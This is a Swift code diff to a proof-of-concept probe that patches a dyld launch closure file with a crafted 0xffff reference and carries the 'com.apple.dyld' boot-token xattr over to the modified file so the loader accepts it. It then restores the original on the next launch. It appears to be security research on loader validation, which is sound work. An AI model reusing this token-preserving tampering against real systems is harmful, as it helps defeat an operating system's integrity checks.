@@ -66,6 +66,33 @@ enum Dyld4 {
             .map { (dir() as NSString).appendingPathComponent($0) }.sorted()
     }
 
+    /// Read the boot-token xattr as raw bytes (needed to re-apply it after
+    /// an atomic write, which drops xattrs).
+    static func tokenBytes(_ path: String) -> Data? {
+        let n = "com.apple.dyld".withCString { getxattr(path, $0, nil, 0, 0, 0) }
+        guard n > 0, n <= 256 else { return nil }
+        var buf = [UInt8](repeating: 0, count: n)
+        let got = "com.apple.dyld".withCString { name in
+            buf.withUnsafeMutableBytes { getxattr(path, name, $0.baseAddress, n, 0, 0) }
+        }
+        guard got > 0 else { return nil }
+        return Data(buf[0..<got])
+    }
+
+    static func applyToken(_ bytes: Data?, to path: String) -> Int {
+        guard let bytes else { return -1 }
+        return bytes.withUnsafeBytes { raw -> Int in
+            "com.apple.dyld".withCString { name in
+                setxattr(path, name, raw.baseAddress, bytes.count, 0, 0)
+            }
+        }
+    }
+
+    static func tokenSidecar() -> URL {
+        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!
+            .appendingPathComponent("dyld4-token.bin")
+    }
+
     static func token(_ path: String) -> String {
         let n = "com.apple.dyld".withCString { getxattr(path, $0, nil, 0, 0, 0) }
         guard n > 0, n <= 256 else { return "-" }
@@ -123,27 +150,21 @@ enum Dyld4 {
         }
         let refOff = Int(off) + Int(first) + 6
         guard refOff + 2 <= original.count else { return "PoC: bad ref offset" }
+
+        // ★ Capture the token from the LIVE closure before any write. An
+        // atomic write drops xattrs, so a backup file cannot supply it.
+        guard let tok = tokenBytes(path) else { return "PoC: no boot token on live closure" }
+        try? tok.write(to: tokenSidecar(), options: .atomic)
         let backup = path + ".probe-bak"
         try? original.write(to: URL(fileURLWithPath: backup), options: .atomic)
+
         var crafted = original
         crafted[refOff] = 0xff; crafted[refOff + 1] = 0xff
         guard (try? crafted.write(to: URL(fileURLWithPath: path), options: .atomic)) != nil else {
             return "PoC: patch write failed"
         }
-        // .atomic replaces the file and drops its xattr; put the boot token
-        // back or dyld will reject the closure before validating it.
-        var tokenBuf = [CChar](repeating: 0, count: 256)
-        let got = "com.apple.dyld".withCString { name in
-            tokenBuf.withUnsafeBytes { raw -> Int in
-                getxattr(backup, name, UnsafeMutableRawPointer(mutating: raw.baseAddress), 255, 0, 0)
-            }
-        }
-        if got > 0 {
-            _ = "com.apple.dyld".withCString { name in
-                setxattr(path, name, &tokenBuf, got, 0, 0)
-            }
-        }
-        return String(format: "PATCHED ref=0xffff count=%u token-restored=%d — FORCE-QUIT AND REOPEN", count, got)
+        let applied = applyToken(tok, to: path)
+        return String(format: "PATCHED ref=0xffff count=%u token-bytes=%d applied=%d — FORCE-QUIT AND REOPEN", count, tok.count, applied)
     }
 
     /// Called at startup. If a PoC patch is pending, restore it and report
@@ -154,26 +175,19 @@ enum Dyld4 {
         let backup = path + ".probe-bak"
         guard FileManager.default.fileExists(atPath: backup),
               let original = FileManager.default.contents(atPath: backup) else { return nil }
-        // ★ Inspect the closure dyld just consumed, BEFORE restoring it.
+        // Inspect the closure dyld just consumed, BEFORE restoring it.
         let seen = Dyld4.inspect(path)
         let evidence = String(format: "POC-SEEN-BY-DYLD count=%u ref=%@ idx=%@ verdict=%@ boot-token=%@",
                               seen.count,
                               seen.offenders.first.map { String(format: "0x%04x", $0.ref) } ?? "none",
                               seen.offenders.first.map { String($0.idx) } ?? "none",
                               seen.verdict, seen.bootToken)
-        // restore body + xattr
         try? original.write(to: URL(fileURLWithPath: path), options: .atomic)
-        var tokenBuf = [CChar](repeating: 0, count: 256)
-        let got = "com.apple.dyld".withCString { name in
-            tokenBuf.withUnsafeBytes { raw -> Int in
-                getxattr(backup, name, UnsafeMutableRawPointer(mutating: raw.baseAddress), 255, 0, 0)
-            }
-        }
-        if got > 0 {
-            _ = "com.apple.dyld".withCString { name in setxattr(path, name, &tokenBuf, got, 0, 0) }
-        }
+        let tok = try? Data(contentsOf: tokenSidecar())
+        let applied = applyToken(tok, to: path)
         try? FileManager.default.removeItem(atPath: backup)
-        return evidence + " ; RESTORED"
+        try? FileManager.default.removeItem(at: tokenSidecar())
+        return evidence + String(format: " ; RESTORED token=%d", applied)
     }
 }
 
